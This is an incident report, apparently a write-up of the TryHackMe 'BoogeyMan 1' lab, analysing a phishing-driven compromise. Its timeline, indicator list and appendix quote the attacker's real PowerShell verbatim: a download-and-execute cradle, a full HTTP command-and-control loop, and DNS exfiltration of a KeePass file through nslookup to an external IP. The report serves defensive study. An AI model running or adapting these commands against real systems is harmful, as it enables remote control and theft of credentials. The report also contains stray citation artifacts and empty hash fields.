# Incident Report — BoogeyMan 1

**Author:** Aditya Gupta • **Date:** 2025-09-19 • **Room:** [BoogeyMan 1](https://tryhackme.com/room/boogeyman1)  
**Severity:** High • **Status:** Closed

---

## Executive Summary

On **2023-01-13 17:09:04**, a targeted phishing email containing a malicious attachment was delivered to Julianne from finance. The execution of the attachment resulted in downloading multiple binaries from attacker-controlled hosts and established command & control (C2) communications. The attacker executed reconnaissance tools and a binary that accessed Microsoft Sticky Notes data, and ultimately exfiltrated a KeePass database to an external IP. Further analysis showed the Sticky Note to contain a sensitive password, resulting in the exposure of a company credit card number stored in the database. Security has isolated the infected host, blocked communications with external IPs at the firewall level, re-imaged the workstation, reset password for user and database, and provided phishing training to Julianne. Bank must be contacted to secure account.

---

## TL;DR

A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting in the execution of the malicious attachment `Invoice_20230103.lnk`. Execution of the attachment resulted in multiple binaries being downloaded from `files.bpakcaging.xyz` and `github.com`, such as `sb.exe`, `sq3.exe`, and `seatbelt.exe`. Attacker then created a C2 communication to `cdn.bpakcaging.xyz:8080`, and exfiltrated a Microsoft Sticky Note `plum.sqlite` to `167.71.211.113` via `nslookup` DNS queries. Attacker also exfiltrated `protected_data.kdbx` file containing company credit card number, which was accessed using exfiltrated password from Microsoft Sticky Note. Security has isolated infected workstation `QL-WKSTN-5693`, blocked communications with attacker at the perimeter firewall level, reset user password and file password, and provided phishing training to Julianne.

## Impact Assessment

- **Data compromised:** Exposure of KeePass database `protected_data.kdbx`, resulting in credit card number exposure. Exposure of sensitive password in Sticky Notes. System enumeration done by downloaded recon tools.
- **Systems affected:** Workstation `QL-WKSTN-5693`
- **Business impact:** Confidential credential exposure, credit card exposure (financial risk). Possible regulatory/compliance exposure  

---

## Timeline of Events

| Time | Action | Command |
| --- | --- | --- |
| 2023-01-13 17:10:07.577594Z | Download & Execute | `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')` |
| 2023-01-13 17:10:09.961645Z | C2 Communication Loop | `$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}` |
| 2023-01-13 17:10:10.847490Z | Recon | ``echo `r;pwd``, `whoami;pwd`, `ls;pwd`, `ps;pwd` |
| 2023-01-13 17:12:17.683688Z | Tool Download | `iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd` |
| 2023-01-13 17:13:41.807193Z | Navigation | `cd Public;pwd`, `cd Music;pwd` |
| 2023-01-13 17:14:33.855233Z | Tool Download | `iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd` |
| 2023-01-13 17:15:06.355560Z | Tool Execution | `.\sb.exe all;pwd`, `.\sb.exe system;pwd`, `.\sb.exe;pwd`, `.\sb.exe -group=all;pwd` |
| 2023-01-13 17:18:05.437844Z | Tool Execution | `Seatbelt.exe -group=user;pwd` |
| 2023-01-13 17:18:13.946269Z | Tool Execution | `.\sb.exe -group=user;pwd` |
| 2023-01-13 17:19:06.035992Z | File Discovery | `ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd` |
| 2023-01-13 17:22:53.558146Z | Recon | `ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState;pwd` |
| 2023-01-13 17:23:38.796891Z | Tool Download | `iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd` |
| 2023-01-13 17:24:12.967200Z | Tool Execution | `.\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\;pwd` |
| 2023-01-13 17:25:38.759011Z | Data Extraction | `.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd` |
| 2023-01-13 17:31:48.507719Z | File Access | `$file='protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd` |
| 2023-01-13 17:32:15.105474Z | File Access | `$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd` |
| 2023-01-13 17:32:23.702462Z | Data Encoding | `$hex = ($bytes\|ForEach-Object ToString X2) -join '';;pwd` |
| 2023-01-13 17:32:41.384043Z | Data Exfiltration | `$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113;} echo "Done";;pwd` |

---

## Indicators of Compromise (IOCs)

- **Domains / Hosts:**
  - `files.bpakcaging[.]xyz` - file hosting used to download binaries
  - `cdn.bpakcaging[.]xyz:8080` - C2 beaconing and command retrieval
  - `hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1` - recon binary downloaded

- **IPs:**
  - `167.71.211.113` - DNS server used for exfiltration / file host

- **Files:**
  - `seatbelt.exe` - C# enumeration tool
  - `sb.exe` - enumeration binary
  - `sq3.exe` - binary used to read sqlite files
  - `protected_data.kdbx` - exfiltrated KeePass DB
    - SHA256: ``
  - `plum.sqlite` - Microsoft Sticky Notes DB accessed
    - SHA256: ``
  - `Invoice_20230103.lnk` - Spearphishing attachment
    - SHA256: ``

- **Email:**
  - `dump.eml` — Spearphishing email containing attachment with embedded Base64 payload

- **Commands / processes:**
  - `iwr`
  - `iex`
  - `whoami`
  - `sb.exe` (various)
  - `sq3.exe`
  - `seatbelt.exe`
  - `nslookup`
  - `$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113;} echo "Done"`
  - `$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i}`

- **User accounts / services:** `QUICKLOGISTICS\julianne`

---

## Evidence & Artifacts

- `artefacts/powershell.json`
- `artefacts/dump.eml`
- `artefacts/capture.pcapng`

---

## Analysis & Findings

- **Triage commands used:**

  | Usage | Command |
  | --- | --- |
  | Sort by `Timestamp`, get unique `ScriptBlockText`, and display both columns | `jq -s 'sort_by(.Timestamp) \| unique_by(.ScriptBlockText)[] \| {Timestamp, ScriptBlockText}' powershell.json` |
  | Search for `http` in `ScriptBlockText` | `cat powershell[.]json \| jq {ScriptBlockText} \| grep http` |
  | Search for `seatbelt.exe` in `ScriptBlockText` | `cat powershell.json \| jq {ScriptBlockText} \| grep seatbelt.exe -i` |
  | Search for `sb.exe` in `ScriptBlockText` | `cat powershell.json \| jq {ScriptBlockText} \| grep sb.exe` |
  | Search for `sq3.exe` in `ScriptBlockText` | `cat powershell.json \| jq {ScriptBlockText} \| grep sq3.exe -i` |
  | Use TShark to filter to C2 destination and DNS logs. Display the DNS query name, and take just the first part of the host. Get unique values and remove newlines to then pipe data into file | `tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 and dns and dns.qry.name contains "bpakcaging.xyz"' -T fields -e dns.qry.name \| cut -d '.' -f1 \| uniq \| tr -d '\n' > protected_data_hex` |
  | Decode hex file to ASCII format and pipe data to file | `cat protected_data_hex \| xxd -r -p > protected_data.kdbx` |

- **Network analysis:**

  - Large volume of `http` traffic to and from C2 domain `cdn.bpakcaging.xyz:8080`. `POST` request methods containing output of commands being run on victim machine.
  - Large amount of DNS queries sent to `167.71.211.113` with domain of `bpakcaging.xyz`. Subdomains contained hex encoded data of exfiltrated file `protected_data.kdbx`.

- **Host analysis:**
  - usage of `whoami`, `echo`, `nslookup`
  - usage of downloaded binaries `sq3.exe`, `sb.exe`, `seatbelt.exe`
  - web activity from shell using commands `Invoke-WebRequest`, `iwr`, `iex`
  - established persistant connection to C2
  - enumerated users, files, objects

- **MITRE ATT&CK mapping:**

  | Tactic | Technique | MITRE ID | Evidence |
  | --- | --- | ---: | --- |
  | Initial Access | Spearphishing Attachment | T1566.001 (Phishing: attachment) | Malicious `dump.eml` with Base64 payload that runs `iex(...)`. :contentReference[oaicite:22]{index=22} |
  | Execution | PowerShell | T1059.001 | `ScriptBlockText` entries executing `iex`, `Invoke-WebRequest` and other PowerShell constructs. :contentReference[oaicite:23]{index=23} |
  | Persistence / C2 | Application Layer Protocol: DNS (and HTTP) | T1071.004 (DNS) + HTTP C2 patterns | Use of DNS subdomains for data exfiltration and `http://cdn.bpakcaging.xyz:8080` beaconing; POSTs to `.../27fe2489`. :contentReference[oaicite:24]{index=24} |
  | Exfiltration | Exfiltration over C2 / Alternative Protocols (DNS / HTTP) | T1041 / T1048 (Exfiltration) | Hex-encoded file exfil via DNS queries and data returned/posted to HTTP endpoints. :contentReference[oaicite:25]{index=25} |
  | Discovery | Host & File Discovery (Seatbelt output / custom enumeration) | T1082 / T1057 (discovery categories) | Execution of `seatbelt.exe` and `sb.exe` enumerating user/system information. :contentReference[oaicite:26]{index=26} |
  | Credential Access | Credentials harvested/targeted (placeholder) | [placeholder] | Evidence: presence of `protected_data.kdbx` (KeePass DB) suggests credential store access. (Confirm with file contents/hashes). :contentReference[oaicite:27]{index=27} |

---

## Remediations and Mitigations

- **Immediate:**

  - Isolated `QL-WKSTN-5693` from the network immediately
  - Collected full disk image, PowerShell logs, and memory capture
  - Removed the attacker binaries (`seatbelt.exe`, `sb.exe`, `sq3.exe`)
  - Blocked C2 communication with firewall
  - Rotated credentials for Julianne and database file

- **Follow-up:**
  - Configure alerts to alert on repeated polling to external domain
  - Look for other hosts contacting `cdn.bpakcaging.xyz`, `files.bpakcaging.xyz`, or `167.71.211.113` in the environment
  - Alert on DNS queries with unusually long subdomains
  - Implement email attachment scanning
  - Enable Powershell logging and ingest into SIEM
  - Provide phishing awareness training

- **Validation:**
  - Verified SIEM is set up and ingesting logs as expected
  - Tested sample network traffic from malicious domains and IPs at firewall level
  - Ensured no traces of malicious binaries downloaded
  - Ensured no C2 communication to external IP
  - Verified last known good backup for re-imaging is functional and safe

---

## Appendix

### Relevant log snippets / commands

- Base64 payload in email attachment:  

  ```console
  aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
  ```

  Decodes to `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')` via [CyberChef](https://gchq.github.io/CyberChef/)

### References

- [MITRE ATT&CK Matrix]